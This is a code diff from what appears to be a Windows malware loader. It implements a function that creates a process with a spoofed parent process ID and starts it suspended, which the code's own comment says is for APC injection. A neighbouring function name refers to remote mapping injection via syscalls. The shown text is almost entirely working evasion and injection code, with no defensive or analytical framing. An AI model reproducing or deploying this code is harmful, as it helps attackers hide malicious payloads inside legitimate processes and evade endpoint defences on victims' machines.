@@ -260,7 +260,7 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 }
 
 // Function used for APC Injection with PPID Spoofing
-BOOL CreatePPidSpoofedAndSuspendedProcess(IN HANDLE hParentProcess, IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) 
+BOOL CreatePPidSpoofedAndSuspendedProcess(IN HANDLE hParentProcess, IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread)
 {
 	CHAR                               lpPath[MAX_PATH * 2];
 	CHAR                               WnDr[MAX_PATH];
@@ -271,10 +271,69 @@ BOOL CreatePPidSpoofedAndSuspendedProcess(IN HANDLE hParentProcess, IN LPCSTR lp
 	STARTUPINFOEXA                     SiEx = { 0 };
 	PROCESS_INFORMATION                Pi = { 0 };
 
-	RtlSecureZeroMemory(&SiEx, sizeof(STARTUPINFOEXA));
-	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));
+	memset(&SiEx, 0, sizeof(STARTUPINFOEXA));
+	memset(&Pi, 0, sizeof(PROCESS_INFORMATION));
 
 	// Setting the size of the structure
 	SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);
 
+	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
+		PRINTA("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
+
+	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
+
+	// This will fail with ERROR_INSUFFICIENT_BUFFER, as expected
+	InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList);
+
+	// Allocating enough memory
+	pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList);
+	if (pThreadAttList == NULL) {
+		PRINTA("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
+
+	// Calling InitializeProcThreadAttributeList again, but passing the right parameters
+	if (!InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &sThreadAttList)) {
+		PRINTA("[!] InitializeProcThreadAttributeList Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
+
+	if (!UpdateProcThreadAttribute(pThreadAttList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)) {
+		PRINTA("[!] UpdateProcThreadAttribute Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
+
+	// Setting the LPPROC_THREAD_ATTRIBUTE_LIST element in SiEx to be equal to what was
+	// created using UpdateProcThreadAttribute - that is the parent process
+	SiEx.lpAttributeList = pThreadAttList;
+
+	if (!CreateProcessA(
+		NULL,
+		lpPath,
+		NULL,
+		NULL,
+		FALSE,
+		EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
+		NULL,
+		NULL,
+		&SiEx.StartupInfo,
+		&Pi)) {
+		PRINTA("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
+		return FALSE;
+	}
+
+	*dwProcessId = Pi.dwProcessId;
+	*hProcess = Pi.hProcess;
+	*hThread = Pi.hThread;
+
+	// Cleaning up
+	DeleteProcThreadAttributeList(pThreadAttList);
+	CloseHandle(hParentProcess);
+
+	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
+		return TRUE;
+
+	return FALSE;
 }
